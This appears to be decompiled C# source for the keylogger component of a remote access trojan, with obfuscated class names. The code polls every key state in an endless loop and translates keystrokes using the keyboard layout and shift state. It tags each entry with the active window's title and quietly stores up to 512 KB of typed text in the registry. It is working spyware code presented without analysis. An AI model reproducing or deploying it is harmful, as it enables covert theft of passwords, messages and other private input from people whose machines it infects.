using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace ns1;

public class GClass1
{
	private string string_0;

	private int int_0;

	private Keys keys_0;

	public string string_1;

	public string string_2;

	public GClass1()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		Class7.smethod_0();
		base._002Ector();
		keys_0 = (Keys)0;
		string_1 = "";
		string_2 = "[kl]";
	}

	private string method_0()
	{
		try
		{
			IntPtr foregroundWindow = Class5.GetForegroundWindow();
			int int_ = default(int);
			GetWindowThreadProcessId(foregroundWindow, ref int_);
			Process processById = Process.GetProcessById(int_);
			if (!(((foregroundWindow.ToInt32() == int_0) & (Operators.CompareString(string_0, processById.MainWindowTitle, false) == 0)) | (processById.MainWindowTitle.Length == 0)))
			{
				int_0 = foregroundWindow.ToInt32();
				string_0 = processById.MainWindowTitle;
				return "\r\n\u0001" + DateAndTime.get_Now().ToString("yy/MM/dd ") + processById.ProcessName + " " + string_0 + "\u0001\r\n";
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return "";
	}

	private string method_1(Keys keys_1)
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Invalid comparison between Unknown and I4
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Invalid comparison between Unknown and I4
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Invalid comparison between Unknown and I4
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Invalid comparison between Unknown and I4
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Invalid comparison between Unknown and I4
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Invalid comparison between Unknown and I4
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_008d: Invalid comparison between Unknown and I4
		//IL_008f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0092: Invalid comparison between Unknown and I4
		//IL_00a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Invalid comparison between Unknown and I4
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00af: Invalid comparison between Unknown and I4
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b7: Invalid comparison between Unknown and I4
		//IL_00b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Invalid comparison between Unknown and I4
		//IL_00e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Invalid comparison between Unknown and I4
		//IL_00ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f5: Invalid comparison between Unknown and I4
		//IL_00f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Invalid comparison between Unknown and I4
		//IL_0102: Unknown result type (might be due to invalid IL or missing references)
		//IL_0111: Unknown result type (might be due to invalid IL or missing references)
		//IL_0135: Unknown result type (might be due to invalid IL or missing references)
		//IL_013b: Expected I4, but got Unknown
		//IL_0158: Unknown result type (might be due to invalid IL or missing references)
		//IL_015e: Expected I4, but got Unknown
		bool flag = Class5.computer_0.get_Keyboard().get_ShiftKeyDown();
		if (Class5.computer_0.get_Keyboard().get_CapsLock())
		{
			flag = ((!flag) ? true : false);
		}
		string result;
		try
		{
			Keys val = keys_1;
			if ((int)val <= 35)
			{
				if ((int)val <= 13)
				{
					if ((int)val == 8)
					{
						goto IL_00c5;
					}
					if ((int)val != 9)
					{
						if ((int)val != 13)
						{
							goto IL_00ff;
						}
						if (string_1.EndsWith("[ENTER]\r\n"))
						{
							return "";
						}
						return "[ENTER]\r\n";
					}
					return "[TAP]\r\n";
				}
				if (val - 16 > 1)
				{
					if ((int)val == 32)
					{
						return " ";
					}
					if ((int)val != 35)
					{
						goto IL_00ff;
					}
				}
			}
			else if ((int)val <= 163)
			{
				if ((int)val == 46)
				{
					goto IL_00c5;
				}
				if (val - 112 > 11 && val - 160 > 3)
				{
					goto IL_00ff;
				}
			}
			else if ((int)val != 65536 && (int)val != 131072 && (int)val != 262144)
			{
				goto IL_00ff;
			}
			return "";
			IL_00ff:
			checked
			{
				if (flag)
				{
					return smethod_0((uint)keys_1).ToUpper();
				}
				result = smethod_0((uint)keys_1);
				goto end_IL_002b;
			}
			IL_00c5:
			return "[" + ((Enum)(Keys)(ref keys_1)).ToString() + "]";
			end_IL_002b:;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			if (flag)
			{
				result = Strings.ChrW((int)keys_1).ToString().ToUpper();
				ProjectData.ClearProjectError();
				string result2 = result;
				ProjectData.ClearProjectError();
				return result2;
			}
			result = Strings.ChrW((int)keys_1).ToString().ToLower();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return result;
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern short GetAsyncKeyState(int int_1);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetKeyboardLayout(int int_1);

	[DllImport("user32.dll")]
	private static extern bool GetKeyboardState(byte[] byte_0);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowThreadProcessId(IntPtr intptr_0, ref int int_1);

	[DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint uint_0, uint uint_1);

	[DllImport("user32.dll")]
	private static extern int ToUnicodeEx(uint uint_0, uint uint_1, byte[] byte_0, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder stringBuilder_0, int int_1, uint uint_2, IntPtr intptr_0);

	private static string smethod_0(uint uint_0)
	{
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			byte[] byte_ = new byte[255];
			if (!GetKeyboardState(byte_))
			{
				return "";
			}
			uint uint_ = MapVirtualKey(uint_0, 0u);
			int int_ = 0;
			IntPtr intptr_ = (IntPtr)GetKeyboardLayout(GetWindowThreadProcessId(Class5.GetForegroundWindow(), ref int_));
			ToUnicodeEx(uint_0, uint_, byte_, stringBuilder, 5, 0u, intptr_);
			return stringBuilder.ToString();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		Keys val = (Keys)checked((int)uint_0);
		return ((Enum)(Keys)(ref val)).ToString();
	}

	public void method_2()
	{
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_007d: Unknown result type (might be due to invalid IL or missing references)
		string_1 = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class5.smethod_12(string_2, "")));
		checked
		{
			try
			{
				int num = 0;
				while (true)
				{
					num++;
					int num2 = 0;
					do
					{
						if ((GetAsyncKeyState(num2) == -32767) & !Class5.computer_0.get_Keyboard().get_CtrlKeyDown())
						{
							Keys keys_ = (Keys)num2;
							string text = method_1(keys_);
							if (text.Length > 0)
							{
								string_1 += method_0();
								string_1 += text;
							}
							keys_0 = keys_;
						}
						num2++;
					}
					while (num2 <= 255);
					if (num == 1000)
					{
						num = 0;
						int num3 = Conversions.ToInteger("512") * 1024;
						if (string_1.Length > num3)
						{
							string_1 = string_1.Remove(0, string_1.Length - num3);
						}
						Class5.smethod_25(string_2, string_1, RegistryValueKind.String);
					}
					Thread.Sleep(1);
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception projectError = ex;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
	}
}
